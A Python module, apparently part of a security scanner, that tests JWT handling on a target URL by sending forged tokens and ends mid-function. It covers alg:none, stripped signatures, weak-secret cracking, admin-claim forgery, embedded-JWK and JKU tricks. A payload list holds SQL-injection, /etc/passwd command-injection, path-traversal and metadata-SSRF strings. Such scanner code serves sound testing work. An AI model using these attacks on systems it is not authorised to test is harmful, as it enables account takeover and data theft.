"""
JWT Attack Service

Comprehensive JWT security testing module for detecting vulnerabilities
in JSON Web Token implementations.

Attack Categories:
- Algorithm Confusion (alg:none, RS256->HS256)
- Signature Bypass
- Key Confusion Attacks
- Claim Manipulation
- JWK/JKU Injection
- Kid Header Injection
- Weak Secret Cracking
- Token Replay & Expiry Bypass
"""

import asyncio
import base64
import hashlib
import hmac
import json
import logging
import re
import secrets
import time
import uuid
from dataclasses import dataclass, field
from datetime import datetime, timedelta
from enum import Enum
from typing import Any, Dict, List, Optional, Tuple, Set, AsyncGenerator
from urllib.parse import urlparse
import httpx

logger = logging.getLogger(__name__)


# =============================================================================
# ENUMS AND CONSTANTS
# =============================================================================

class JWTAttackType(str, Enum):
    """Types of JWT attacks."""
    ALG_NONE = "alg_none"
    ALG_CONFUSION = "alg_confusion"
    SIGNATURE_STRIP = "signature_strip"
    WEAK_SECRET = "weak_secret"
    KEY_CONFUSION = "key_confusion"
    CLAIM_TAMPERING = "claim_tampering"
    EXP_BYPASS = "exp_bypass"
    JKU_INJECTION = "jku_injection"
    JWK_INJECTION = "jwk_injection"
    KID_INJECTION = "kid_injection"
    KID_SQL_INJECTION = "kid_sql_injection"
    KID_PATH_TRAVERSAL = "kid_path_traversal"
    X5U_INJECTION = "x5u_injection"
    TOKEN_REPLAY = "token_replay"
    AUDIENCE_BYPASS = "audience_bypass"
    ISSUER_SPOOF = "issuer_spoof"
    EMBEDDED_JWK = "embedded_jwk"
    CVE_2022_21449 = "cve_2022_21449"  # Psychic signatures (Java ECDSA)


class JWTVulnerability(str, Enum):
    """Detected JWT vulnerabilities."""
    ALG_NONE_ACCEPTED = "alg_none_accepted"
    SIGNATURE_NOT_VERIFIED = "signature_not_verified"
    WEAK_SECRET = "weak_secret"
    KEY_CONFUSION = "key_confusion"
    EXPIRED_TOKEN_ACCEPTED = "expired_token_accepted"
    TAMPERED_CLAIMS_ACCEPTED = "tampered_claims_accepted"
    JKU_INJECTION = "jku_injection"
    JWK_INJECTION = "jwk_injection"
    KID_INJECTION = "kid_injection"
    AUDIENCE_NOT_VERIFIED = "audience_not_verified"
    ISSUER_NOT_VERIFIED = "issuer_not_verified"
    NULL_SIGNATURE_ACCEPTED = "null_signature_accepted"


# Common weak secrets for brute force
COMMON_JWT_SECRETS = [
    "secret", "password", "123456", "12345678", "qwerty", "abc123",
    "password1", "password123", "admin", "letmein", "welcome",
    "monkey", "dragon", "master", "login", "princess", "solo",
    "passw0rd", "starwars", "admin123", "root", "toor", "pass",
    "test", "guest", "info", "mysql", "oracle", "postgres",
    "changeme", "changeit", "default", "system", "service",
    "key", "private", "public", "jwt", "token", "auth",
    "secret_key", "secret-key", "secretkey", "jwt_secret",
    "jwt-secret", "jwtsecret", "api_key", "api-key", "apikey",
    "super_secret", "supersecret", "my_secret", "mysecret",
    "your_secret", "yoursecret", "the_secret", "thesecret",
    "application_secret", "app_secret", "appsecret",
    "development", "production", "staging", "testing",
    "secret123", "secret1234", "secret12345", "jwt123",
    "HS256", "HS384", "HS512", "RS256", "RS384", "RS512",
    "hmac-secret", "hmac_secret", "hmacsecret",
    "keyboard", "hunter2", "trustno1", "batman", "shadow",
    "sunshine", "iloveyou", "princess", "football", "baseball",
    "access", "1234567890", "0987654321", "qwertyuiop",
    "asdfghjkl", "zxcvbnm", "a]!@#$%^&*()", "P@ssw0rd",
]

# Kid injection payloads
KID_INJECTION_PAYLOADS = [
    # SQL Injection
    "' OR '1'='1",
    "' OR 1=1--",
    "'; DROP TABLE keys;--",
    "' UNION SELECT 'secret'--",
    "\" OR \"1\"=\"1",
    
    # Path Traversal
    "../../../dev/null",
    "../../../../../../dev/null",
    "/dev/null",
    "../../../etc/passwd",
    "....//....//....//dev/null",
    
    # Command Injection (via kid processing)
    "| cat /etc/passwd",
    "; cat /etc/passwd",
    "$(cat /etc/passwd)",
    "`cat /etc/passwd`",
    
    # SSRF via kid
    "http://localhost/keys/default",
    "http://127.0.0.1/keys/default",
    "http://169.254.169.254/",
    
    # Empty/null keys
    "",
    "null",
    "undefined",
    "none",
    "0",
    "false",
]


# =============================================================================
# DATA CLASSES
# =============================================================================

@dataclass
class JWTComponents:
    """Parsed JWT components."""
    header: Dict[str, Any]
    payload: Dict[str, Any]
    signature: bytes
    raw_header: str
    raw_payload: str
    raw_signature: str
    original_token: str
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            "header": self.header,
            "payload": self.payload,
            "signature_length": len(self.signature),
            "algorithm": self.header.get("alg"),
            "type": self.header.get("typ"),
        }


@dataclass
class JWTAttackResult:
    """Result of a JWT attack attempt."""
    attack_type: JWTAttackType
    success: bool
    vulnerability: Optional[JWTVulnerability] = None
    original_token: str = ""
    modified_token: str = ""
    description: str = ""
    evidence: List[str] = field(default_factory=list)
    response_status: int = 0
    response_body: str = ""
    severity: str = "medium"
    cvss_score: float = 0.0
    remediation: str = ""
    cracked_secret: Optional[str] = None
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            "attack_type": self.attack_type.value,
            "success": self.success,
            "vulnerability": self.vulnerability.value if self.vulnerability else None,
            "modified_token": self.modified_token[:50] + "..." if len(self.modified_token) > 50 else self.modified_token,
            "description": self.description,
            "evidence": self.evidence,
            "response_status": self.response_status,
            "severity": self.severity,
            "cvss_score": self.cvss_score,
            "remediation": self.remediation,
            "cracked_secret": self.cracked_secret,
        }


@dataclass
class JWTScanConfig:
    """Configuration for JWT scanning."""
    target_url: str
    token_location: str = "header"  # header, cookie, body
    token_name: str = "Authorization"  # Header name or cookie name
    token_prefix: str = "Bearer "  # e.g., "Bearer " for Authorization header
    http_method: str = "GET"
    additional_headers: Dict[str, str] = field(default_factory=dict)
    request_body: Optional[str] = None
    success_indicators: List[str] = field(default_factory=list)  # Strings indicating auth success
    failure_indicators: List[str] = field(default_factory=list)  # Strings indicating auth failure
    timeout: float = 10.0
    max_secrets_to_try: int = 200
    custom_secrets: List[str] = field(default_factory=list)
    jku_callback_url: Optional[str] = None  # For JKU injection
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            "target_url": self.target_url,
            "token_location": self.token_location,
            "token_name": self.token_name,
            "http_method": self.http_method,
            "timeout": self.timeout,
        }


@dataclass
class JWTScanResult:
    """Complete JWT scan result."""
    scan_id: str = field(default_factory=lambda: uuid.uuid4().hex[:12])
    target_url: str = ""
    original_token: str = ""
    token_analysis: Optional[Dict[str, Any]] = None
    vulnerabilities: List[JWTAttackResult] = field(default_factory=list)
    attacks_performed: int = 0
    successful_attacks: int = 0
    scan_duration: float = 0.0
    started_at: str = field(default_factory=lambda: datetime.utcnow().isoformat())
    completed_at: Optional[str] = None
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            "scan_id": self.scan_id,
            "target_url": self.target_url,
            "original_token": self.original_token[:50] + "..." if len(self.original_token) > 50 else self.original_token,
            "token_analysis": self.token_analysis,
            "vulnerabilities": [v.to_dict() for v in self.vulnerabilities if v.success],
            "attacks_performed": self.attacks_performed,
            "successful_attacks": self.successful_attacks,
            "scan_duration": self.scan_duration,
            "started_at": self.started_at,
            "completed_at": self.completed_at,
        }


# =============================================================================
# JWT PARSING AND MANIPULATION
# =============================================================================

def base64url_encode(data: bytes) -> str:
    """Base64url encode without padding."""
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode('utf-8')


def base64url_decode(data: str) -> bytes:
    """Base64url decode with padding restoration."""
    # Add padding if needed
    padding = 4 - len(data) % 4
    if padding != 4:
        data += '=' * padding
    return base64.urlsafe_b64decode(data)


def parse_jwt(token: str) -> Optional[JWTComponents]:
    """Parse a JWT token into its components."""
    try:
        parts = token.split('.')
        if len(parts) != 3:
            return None
        
        raw_header, raw_payload, raw_signature = parts
        
        header = json.loads(base64url_decode(raw_header))
        payload = json.loads(base64url_decode(raw_payload))
        signature = base64url_decode(raw_signature) if raw_signature else b''
        
        return JWTComponents(
            header=header,
            payload=payload,
            signature=signature,
            raw_header=raw_header,
            raw_payload=raw_payload,
            raw_signature=raw_signature,
            original_token=token,
        )
    except Exception as e:
        logger.debug(f"Failed to parse JWT: {e}")
        return None


def create_jwt(header: Dict, payload: Dict, secret: str = "", algorithm: str = "none") -> str:
    """Create a JWT token with the given components."""
    header_b64 = base64url_encode(json.dumps(header, separators=(',', ':')).encode())
    payload_b64 = base64url_encode(json.dumps(payload, separators=(',', ':')).encode())
    
    message = f"{header_b64}.{payload_b64}"
    
    if algorithm.lower() == "none" or not secret:
        signature = ""
    elif algorithm.upper() in ("HS256", "HS384", "HS512"):
        hash_alg = {
            "HS256": hashlib.sha256,
            "HS384": hashlib.sha384,
            "HS512": hashlib.sha512,
        }[algorithm.upper()]
        signature = base64url_encode(
            hmac.new(secret.encode(), message.encode(), hash_alg).digest()
        )
    else:
        # For RS/ES algorithms we can't sign without private key
        signature = ""
    
    return f"{message}.{signature}"


def modify_jwt_header(jwt: JWTComponents, modifications: Dict[str, Any]) -> str:
    """Modify JWT header and return new token (unsigned)."""
    new_header = {**jwt.header, **modifications}
    header_b64 = base64url_encode(json.dumps(new_header, separators=(',', ':')).encode())
    return f"{header_b64}.{jwt.raw_payload}.{jwt.raw_signature}"


def modify_jwt_payload(jwt: JWTComponents, modifications: Dict[str, Any]) -> str:
    """Modify JWT payload and return new token (with original signature)."""
    new_payload = {**jwt.payload, **modifications}
    payload_b64 = base64url_encode(json.dumps(new_payload, separators=(',', ':')).encode())
    return f"{jwt.raw_header}.{payload_b64}.{jwt.raw_signature}"


def resign_jwt(jwt: JWTComponents, new_header: Dict, new_payload: Dict, secret: str, algorithm: str) -> str:
    """Create a new JWT with modified header/payload and sign it."""
    return create_jwt(new_header, new_payload, secret, algorithm)


def analyze_jwt(token: str) -> Dict[str, Any]:
    """Analyze a JWT token for security issues."""
    jwt = parse_jwt(token)
    if not jwt:
        return {"error": "Invalid JWT format"}
    
    analysis = {
        "valid_format": True,
        "header": jwt.header,
        "payload": jwt.payload,
        "algorithm": jwt.header.get("alg", "unknown"),
        "type": jwt.header.get("typ", "JWT"),
        "issues": [],
        "claims": {},
    }
    
    alg = jwt.header.get("alg", "").upper()
    
    # Check algorithm
    if alg == "NONE":
        analysis["issues"].append({
            "severity": "critical",
            "issue": "Algorithm is 'none' - signature not required",
        })
    elif alg in ("HS256", "HS384", "HS512"):
        analysis["issues"].append({
            "severity": "info",
            "issue": f"Using symmetric algorithm {alg} - vulnerable to brute force if weak secret",
        })
    
    # Check claims
    now = datetime.utcnow().timestamp()
    
    if "exp" in jwt.payload:
        exp = jwt.payload["exp"]
        analysis["claims"]["exp"] = {
            "value": exp,
            "datetime": datetime.fromtimestamp(exp).isoformat(),
            "expired": exp < now,
        }
        if exp < now:
            analysis["issues"].append({
                "severity": "info",
                "issue": "Token is expired",
            })
    else:
        analysis["issues"].append({
            "severity": "medium",
            "issue": "No expiration claim (exp) - token never expires",
        })
    
    if "iat" in jwt.payload:
        iat = jwt.payload["iat"]
        analysis["claims"]["iat"] = {
            "value": iat,
            "datetime": datetime.fromtimestamp(iat).isoformat(),
        }
    
    if "nbf" in jwt.payload:
        nbf = jwt.payload["nbf"]
        analysis["claims"]["nbf"] = {
            "value": nbf,
            "datetime": datetime.fromtimestamp(nbf).isoformat(),
            "not_yet_valid": nbf > now,
        }
    
    # Check for sensitive data
    sensitive_keys = ["password", "secret", "key", "credit_card", "ssn", "api_key"]
    for key in jwt.payload:
        if any(s in key.lower() for s in sensitive_keys):
            analysis["issues"].append({
                "severity": "high",
                "issue": f"Potentially sensitive data in payload: {key}",
            })
    
    # Check for common claims
    for claim in ["sub", "aud", "iss", "jti"]:
        if claim in jwt.payload:
            analysis["claims"][claim] = jwt.payload[claim]
    
    # Check header for injection vectors
    if "jku" in jwt.header:
        analysis["issues"].append({
            "severity": "high",
            "issue": f"JKU header present - potential SSRF/key injection: {jwt.header['jku']}",
        })
    
    if "x5u" in jwt.header:
        analysis["issues"].append({
            "severity": "high",
            "issue": f"X5U header present - potential SSRF/cert injection: {jwt.header['x5u']}",
        })
    
    if "kid" in jwt.header:
        analysis["issues"].append({
            "severity": "info",
            "issue": f"KID header present - test for injection: {jwt.header['kid']}",
        })
    
    if "jwk" in jwt.header:
        analysis["issues"].append({
            "severity": "high",
            "issue": "Embedded JWK in header - potential key injection",
        })
    
    return analysis


# =============================================================================
# JWT ATTACK IMPLEMENTATIONS
# =============================================================================

class JWTAttacker:
    """JWT attack implementation class."""
    
    def __init__(self, config: JWTScanConfig):
        self.config = config
        self.client: Optional[httpx.AsyncClient] = None
        self.baseline_response: Optional[httpx.Response] = None
        self.baseline_authenticated: bool = False
    
    async def __aenter__(self):
        # SSL verification enabled by default; configure via environment if needed
        self.client = httpx.AsyncClient(timeout=self.config.timeout, verify=True)
        return self
    
    async def __aexit__(self, *args):
        if self.client:
            await self.client.aclose()
    
    async def _send_request(self, token: str) -> httpx.Response:
        """Send a request with the given token."""
        headers = dict(self.config.additional_headers)
        cookies = {}
        body = self.config.request_body
        
        # Add token based on location
        if self.config.token_location == "header":
            headers[self.config.token_name] = f"{self.config.token_prefix}{token}"
        elif self.config.token_location == "cookie":
            cookies[self.config.token_name] = token
        elif self.config.token_location == "body":
            # Replace token in body
            if body:
                body = body.replace("{{TOKEN}}", token)
        
        method = self.config.http_method.upper()
        
        if method == "GET":
            response = await self.client.get(
                self.config.target_url,
                headers=headers,
                cookies=cookies,
            )
        elif method == "POST":
            response = await self.client.post(
                self.config.target_url,
                headers=headers,
                cookies=cookies,
                content=body,
            )
        else:
            response = await self.client.request(
                method,
                self.config.target_url,
                headers=headers,
                cookies=cookies,
                content=body,
            )
        
        return response
    
    def _is_authenticated(self, response: httpx.Response) -> bool:
        """Check if the response indicates successful authentication."""
        # Check status code
        if response.status_code == 401 or response.status_code == 403:
            return False
        
        body = response.text.lower()
        
        # Check failure indicators
        for indicator in self.config.failure_indicators:
            if indicator.lower() in body:
                return False
        
        # Check success indicators
        if self.config.success_indicators:
            for indicator in self.config.success_indicators:
                if indicator.lower() in body:
                    return True
            return False
        
        # Default: 2xx = success
        return 200 <= response.status_code < 300
    
    async def establish_baseline(self, original_token: str) -> bool:
        """Establish baseline response with original token."""
        try:
            self.baseline_response = await self._send_request(original_token)
            self.baseline_authenticated = self._is_authenticated(self.baseline_response)
            return True
        except Exception as e:
            logger.error(f"Failed to establish baseline: {e}")
            return False
    
    async def attack_alg_none(self, jwt: JWTComponents) -> JWTAttackResult:
        """Test algorithm=none vulnerability."""
        result = JWTAttackResult(
            attack_type=JWTAttackType.ALG_NONE,
            original_token=jwt.original_token,
        )
        
        # Try various "none" variations
        none_variants = ["none", "None", "NONE", "nOnE", "NonE"]
        
        for variant in none_variants:
            new_header = {**jwt.header, "alg": variant}
            # Token with no signature
            header_b64 = base64url_encode(json.dumps(new_header, separators=(',', ':')).encode())
            modified_token = f"{header_b64}.{jwt.raw_payload}."
            
            try:
                response = await self._send_request(modified_token)
                
                if self._is_authenticated(response):
                    result.success = True
                    result.vulnerability = JWTVulnerability.ALG_NONE_ACCEPTED
                    result.modified_token = modified_token
                    result.response_status = response.status_code
                    result.description = f"Server accepts 'alg: {variant}' without signature verification"
                    result.evidence = [
                        f"Algorithm set to: {variant}",
                        "Signature stripped from token",
                        f"Response status: {response.status_code}",
                        "Authentication succeeded",
                    ]
                    result.severity = "critical"
                    result.cvss_score = 9.8
                    result.remediation = "Reject tokens with algorithm 'none'. Explicitly specify allowed algorithms."
                    return result
            except Exception as e:
                logger.debug(f"alg=none attack failed: {e}")
        
        result.description = "Server properly rejects algorithm 'none'"
        return result
    
    async def attack_signature_strip(self, jwt: JWTComponents) -> JWTAttackResult:
        """Test if server accepts tokens with empty/invalid signatures."""
        result = JWTAttackResult(
            attack_type=JWTAttackType.SIGNATURE_STRIP,
            original_token=jwt.original_token,
        )
        
        test_cases = [
            ("empty_signature", f"{jwt.raw_header}.{jwt.raw_payload}."),
            ("null_signature", f"{jwt.raw_header}.{jwt.raw_payload}.null"),
            ("invalid_signature", f"{jwt.raw_header}.{jwt.raw_payload}.invalidsignature"),
            ("truncated_signature", f"{jwt.raw_header}.{jwt.raw_payload}.{jwt.raw_signature[:10]}"),
        ]
        
        for name, modified_token in test_cases:
            try:
                response = await self._send_request(modified_token)
                
                if self._is_authenticated(response):
                    result.success = True
                    result.vulnerability = JWTVulnerability.SIGNATURE_NOT_VERIFIED
                    result.modified_token = modified_token
                    result.response_status = response.status_code
                    result.description = f"Server accepts token with {name}"
                    result.evidence = [
                        f"Test case: {name}",
                        "Signature verification bypassed",
                        f"Response status: {response.status_code}",
                    ]
                    result.severity = "critical"
                    result.cvss_score = 9.8
                    result.remediation = "Always verify JWT signatures. Never skip signature validation."
                    return result
            except Exception as e:
                logger.debug(f"Signature strip test {name} failed: {e}")
        
        result.description = "Server properly validates signatures"
        return result
    
    async def attack_weak_secret(self, jwt: JWTComponents) -> JWTAttackResult:
        """Attempt to crack weak HMAC secrets."""
        result = JWTAttackResult(
            attack_type=JWTAttackType.WEAK_SECRET,
            original_token=jwt.original_token,
        )
        
        alg = jwt.header.get("alg", "").upper()
        if alg not in ("HS256", "HS384", "HS512"):
            result.description = f"Algorithm {alg} is not HMAC-based, skipping weak secret test"
            return result
        
        hash_alg = {
            "HS256": hashlib.sha256,
            "HS384": hashlib.sha384,
            "HS512": hashlib.sha512,
        }[alg]
        
        message = f"{jwt.raw_header}.{jwt.raw_payload}".encode()
        target_signature = jwt.signature
        
        # Combine common secrets with custom ones
        secrets_to_try = list(COMMON_JWT_SECRETS)
        secrets_to_try.extend(self.config.custom_secrets)
        secrets_to_try = secrets_to_try[:self.config.max_secrets_to_try]
        
        for secret in secrets_to_try:
            try:
                computed_sig = hmac.new(secret.encode(), message, hash_alg).digest()
                if computed_sig == target_signature:
                    result.success = True
                    result.vulnerability = JWTVulnerability.WEAK_SECRET
                    result.cracked_secret = secret
                    result.description = f"JWT secret cracked: '{secret}'"
                    result.evidence = [
                        f"Algorithm: {alg}",
                        f"Cracked secret: {secret}",
                        "Weak/common secret used for signing",
                    ]
                    result.severity = "critical"
                    result.cvss_score = 9.1
                    result.remediation = "Use a strong, randomly generated secret (256+ bits). Rotate secrets regularly."
                    
                    # Test if we can forge tokens
                    forged_payload = {**jwt.payload, "admin": True, "role": "admin"}
                    forged_token = create_jwt(jwt.header, forged_payload, secret, alg)
                    result.modified_token = forged_token
                    
                    return result
            except Exception:
                continue
        
        result.description = f"Secret not found in {len(secrets_to_try)} common passwords"
        return result
    
    async def attack_key_confusion(self, jwt: JWTComponents) -> JWTAttackResult:
        """Test RS256 to HS256 key confusion attack."""
        result = JWTAttackResult(
            attack_type=JWTAttackType.KEY_CONFUSION,
            original_token=jwt.original_token,
        )
        
        alg = jwt.header.get("alg", "").upper()
        if not alg.startswith("RS") and not alg.startswith("ES") and not alg.startswith("PS"):
            result.description = "Token not using asymmetric algorithm, key confusion not applicable"
            return result
        
        # We need to try with potential public keys
        # Common sources: jwks endpoint, x5c header, etc.
        result.description = "Key confusion attack requires public key (check jwks endpoint manually)"
        result.evidence = [
            f"Original algorithm: {alg}",
            "Attack: Change to HS256 and sign with public key as secret",
            "Requires: Access to the server's public key",
        ]
        
        return result
    
    async def attack_claim_tampering(self, jwt: JWTComponents) -> JWTAttackResult:
        """Test if tampered claims are accepted."""
        result = JWTAttackResult(
            attack_type=JWTAttackType.CLAIM_TAMPERING,
            original_token=jwt.original_token,
        )
        
        # Tamper with common privilege claims
        tamper_tests = []
        
        # Admin/role escalation
        tamper_tests.append({
            "name": "admin_true",
            "mods": {"admin": True},
        })
        tamper_tests.append({
            "name": "role_admin",
            "mods": {"role": "admin"},
        })
        tamper_tests.append({
            "name": "roles_admin",
            "mods": {"roles": ["admin", "superuser"]},
        })
        tamper_tests.append({
            "name": "is_admin",
            "mods": {"is_admin": True, "isAdmin": True},
        })
        
        # User ID manipulation
        if "sub" in jwt.payload:
            tamper_tests.append({
                "name": "sub_admin",
                "mods": {"sub": "admin"},
            })
        if "user_id" in jwt.payload or "userId" in jwt.payload:
            tamper_tests.append({
                "name": "user_id_1",
                "mods": {"user_id": 1, "userId": 1},
            })
        
        for test in tamper_tests:
            modified_payload = {**jwt.payload, **test["mods"]}
            payload_b64 = base64url_encode(json.dumps(modified_payload, separators=(',', ':')).encode())
            modified_token = f"{jwt.raw_header}.{payload_b64}.{jwt.raw_signature}"
            
            try:
                response = await self._send_request(modified_token)
                
                # Compare with baseline - if we get different (better) access
                if self._is_authenticated(response):
                    # Check if response is different from baseline (might indicate elevated privileges)
                    if self.baseline_response and len(response.text) != len(self.baseline_response.text):
                        result.success = True
                        result.vulnerability = JWTVulnerability.TAMPERED_CLAIMS_ACCEPTED
                        result.modified_token = modified_token
                        result.response_status = response.status_code
                        result.description = f"Server accepts tampered claims: {test['name']}"
                        result.evidence = [
                            f"Test: {test['name']}",
                            f"Modified claims: {test['mods']}",
                            "Response differs from baseline (possible privilege escalation)",
                        ]
                        result.severity = "high"
                        result.cvss_score = 8.1
                        result.remediation = "Always verify JWT signature before trusting claims. Never skip validation."
                        return result
            except Exception as e:
                logger.debug(f"Claim tampering test {test['name']} failed: {e}")
        
        result.description = "Server properly validates token integrity"
        return result
    
    async def attack_exp_bypass(self, jwt: JWTComponents) -> JWTAttackResult:
        """Test if expired tokens are accepted."""
        result = JWTAttackResult(
            attack_type=JWTAttackType.EXP_BYPASS,
            original_token=jwt.original_token,
        )
        
        # Create token with past expiration
        past_exp = int((datetime.utcnow() - timedelta(days=30)).timestamp())
        modified_payload = {**jwt.payload, "exp": past_exp}
        payload_b64 = base64url_encode(json.dumps(modified_payload, separators=(',', ':')).encode())
        modified_token = f"{jwt.raw_header}.{payload_b64}.{jwt.raw_signature}"
        
        try:
            response = await self._send_request(modified_token)
            
            if self._is_authenticated(response):
                result.success = True
                result.vulnerability = JWTVulnerability.EXPIRED_TOKEN_ACCEPTED
                result.modified_token = modified_token
                result.response_status = response.status_code
                result.description = "Server accepts expired tokens"
                result.evidence = [
                    f"Token expiration set to: {datetime.fromtimestamp(past_exp).isoformat()}",
                    "30 days in the past",
                    "Server did not validate expiration",
                ]
                result.severity = "medium"
                result.cvss_score = 6.5
                result.remediation = "Always validate the 'exp' claim. Reject expired tokens."
                return result
        except Exception as e:
            logger.debug(f"Exp bypass test failed: {e}")
        
        result.description = "Server properly validates token expiration"
        return result
    
    async def attack_kid_injection(self, jwt: JWTComponents) -> JWTAttackResult:
        """Test KID header injection vulnerabilities."""
        result = JWTAttackResult(
            attack_type=JWTAttackType.KID_INJECTION,
            original_token=jwt.original_token,
        )
        
        successful_payloads = []
        
        for payload in KID_INJECTION_PAYLOADS:
            new_header = {**jwt.header, "kid": payload}
            header_b64 = base64url_encode(json.dumps(new_header, separators=(',', ':')).encode())
            modified_token = f"{header_b64}.{jwt.raw_payload}.{jwt.raw_signature}"
            
            try:
                response = await self._send_request(modified_token)
                
                # Check for interesting responses (errors might reveal info)
                if self._is_authenticated(response):
                    successful_payloads.append(payload)
                elif response.status_code == 500:
                    # Server error might indicate injection worked
                    result.evidence.append(f"Server error with kid='{payload[:30]}...'")
            except Exception:
                continue
        
        if successful_payloads:
            result.success = True
            result.vulnerability = JWTVulnerability.KID_INJECTION
            result.description = f"KID injection successful with {len(successful_payloads)} payload(s)"
            result.evidence.extend([
                f"Successful payload: {p[:50]}" for p in successful_payloads[:5]
            ])
            result.severity = "high"
            result.cvss_score = 8.6
            result.remediation = "Sanitize and validate the 'kid' header. Use allowlist for key identifiers."
        else:
            result.description = "KID injection tests unsuccessful"
        
        return result
    
    async def attack_jku_injection(self, jwt: JWTComponents, callback_url: str) -> JWTAttackResult:
        """Test JKU (JSON Web Key Set URL) injection."""
        result = JWTAttackResult(
            attack_type=JWTAttackType.JKU_INJECTION,
            original_token=jwt.original_token,
        )
        
        # Create JKU header pointing to attacker-controlled URL
        jku_tests = [
            callback_url,
            f"{callback_url}/.well-known/jwks.json",
            f"{callback_url}/jwks",
        ]
        
        for jku in jku_tests:
            new_header = {**jwt.header, "jku": jku}
            header_b64 = base64url_encode(json.dumps(new_header, separators=(',', ':')).encode())
            modified_token = f"{header_b64}.{jwt.raw_payload}.{jwt.raw_signature}"
            
            try:
                response = await self._send_request(modified_token)
                result.evidence.append(f"Tested jku={jku}, status={response.status_code}")
            except Exception as e:
                result.evidence.append(f"Tested jku={jku}, error={str(e)[:50]}")
        
        result.description = "JKU injection test completed - check callback server for requests"
        result.evidence.append("If callback received request, JKU injection is possible")
        result.severity = "high"
        result.remediation = "Validate and whitelist allowed JKU URLs. Disable JKU processing if not needed."
        
        return result
    
    async def attack_embedded_jwk(self, jwt: JWTComponents) -> JWTAttackResult:
        """Test embedded JWK attack."""
        result = JWTAttackResult(
            attack_type=JWTAttackType.EMBEDDED_JWK,
            original_token=jwt.original_token,
        )
        
        # Generate a test symmetric key to embed
        test_secret = secrets.token_hex(32)
        
        # Create embedded JWK for HS256
        embedded_jwk = {
            "kty": "oct",
            "k": base64url_encode(test_secret.encode()),
            "alg": "HS256",
        }
        
        new_header = {
            "alg": "HS256",
            "typ": "JWT",
            "jwk": embedded_jwk,
        }
        
        # Create token signed with our embedded key
        modified_token = create_jwt(new_header, jwt.payload, test_secret, "HS256")
        result.modified_token = modified_token
        
        try:
            response = await self._send_request(modified_token)
            
            if self._is_authenticated(response):
                result.success = True
                result.vulnerability = JWTVulnerability.JWK_INJECTION
                result.response_status = response.status_code
                result.description = "Server accepts embedded JWK and uses it for verification"
                result.evidence = [
                    "Embedded symmetric key in JWT header",
                    "Server used attacker-provided key for verification",
                    "Complete authentication bypass",
                ]
                result.severity = "critical"
                result.cvss_score = 10.0
                result.remediation = "Never trust embedded JWK in tokens. Use server-side key storage only."
                return result
        except Exception as e:
            logger.debug(f"Embedded JWK attack failed: {e}")
        
        result.description = "Server properly ignores embedded JWK"
        return result
    
    async def attack_audience_bypass(self, jwt: JWTComponents) -> JWTAttackResult:
        """Test if audience claim is validated."""
        result = JWTAttackResult(
            attack_type=JWTAttackType.AUDIENCE_BYPASS,
            original_token=jwt.original_token,
        )
        
        # Test with different audience values
        audience_tests = [
            {"aud": "different-audience"},
            {"aud": "*"},
            {"aud": ""},
            {"aud": ["different", "audiences"]},
        ]
        
        # Remove audience entirely
        payload_no_aud = {k: v for k, v in jwt.payload.items() if k != "aud"}
        audience_tests.append(payload_no_aud)
        
        for test_payload in audience_tests:
            if isinstance(test_payload, dict) and "aud" in test_payload:
                modified_payload = {**jwt.payload, **test_payload}
            else:
                modified_payload = test_payload
            
            payload_b64 = base64url_encode(json.dumps(modified_payload, separators=(',', ':')).encode())
            modified_token = f"{jwt.raw_header}.{payload_b64}.{jwt.raw_signature}"
            
            try:
                response = await self._send_request(modified_token)
                
                if self._is_authenticated(response):
                    result.success = True
                    result.vulnerability = JWTVulnerability.AUDIENCE_NOT_VERIFIED
                    result.modified_token = modified_token
                    result.response_status = response.status_code
                    result.description = "Server does not properly validate audience claim"
                    result.evidence = [
                        f"Modified audience: {test_payload.get('aud', 'removed')}",
                        "Token accepted with different/missing audience",
                    ]
                    result.severity = "medium"
                    result.cvss_score = 5.3
                    result.remediation = "Always validate the 'aud' claim against expected values."
                    return result
            except Exception:
                continue
        
        result.description = "Server properly validates audience claim"
        return result


# =============================================================================
# JWT SCANNER
# =============================================================================

class JWTScanner:
    """Comprehensive JWT security scanner."""
    
    def __init__(self, config: JWTScanConfig):
        self.config = config
        self.result = JWTScanResult(target_url=config.target_url)
    
    async def scan(
        self,
        token: str,
        attacks: Optional[List[JWTAttackType]] = None,
    ) -> AsyncGenerator[Dict[str, Any], None]:
        """
        Perform comprehensive JWT security scan.
        
        Yields progress events and results.
        """
        start_time = time.time()
        self.result.original_token = token
        
        # Parse and analyze token
        jwt = parse_jwt(token)
        if not jwt:
            yield {
                "type": "error",
                "message": "Invalid JWT format",
            }
            return
        
        # Analyze token
        self.result.token_analysis = analyze_jwt(token)
        yield {
            "type": "analysis_complete",
            "analysis": self.result.token_analysis,
        }
        
        # Determine attacks to run
        if attacks is None:
            attacks = list(JWTAttackType)
        
        async with JWTAttacker(self.config) as attacker:
            # Establish baseline
            yield {"type": "progress", "message": "Establishing baseline..."}
            if not await attacker.establish_baseline(token):
                yield {"type": "warning", "message": "Could not establish baseline response"}
            
            # Run attacks
            attack_methods = {
                JWTAttackType.ALG_NONE: attacker.attack_alg_none,
                JWTAttackType.SIGNATURE_STRIP: attacker.attack_signature_strip,
                JWTAttackType.WEAK_SECRET: attacker.attack_weak_secret,
                JWTAttackType.KEY_CONFUSION: attacker.attack_key_confusion,
                JWTAttackType.CLAIM_TAMPERING: attacker.attack_claim_tampering,
                JWTAttackType.EXP_BYPASS: attacker.attack_exp_bypass,
                JWTAttackType.KID_INJECTION: attacker.attack_kid_injection,
                JWTAttackType.EMBEDDED_JWK: attacker.attack_embedded_jwk,
                JWTAttackType.AUDIENCE_BYPASS: attacker.attack_audience_bypass,
            }
            
            for attack_type in attacks:
                if attack_type not in attack_methods:
                    continue
                
                yield {
                    "type": "attack_start",
                    "attack": attack_type.value,
                }
                
                self.result.attacks_performed += 1
                
                try:
                    # Special handling for JKU injection (needs callback URL)
                    if attack_type == JWTAttackType.JKU_INJECTION:
                        if self.config.jku_callback_url:
                            result = await attacker.attack_jku_injection(jwt, self.config.jku_callback_url)
                        else:
                            continue
                    else:
                        result = await attack_methods[attack_type](jwt)
                    
                    self.result.vulnerabilities.append(result)
                    
                    if result.success:
                        self.result.successful_attacks += 1
                        yield {
                            "type": "vulnerability_found",
                            "attack": attack_type.value,
                            "result": result.to_dict(),
                        }
                    else:
                        yield {
                            "type": "attack_complete",
                            "attack": attack_type.value,
                            "success": False,
                        }
                    
                except Exception as e:
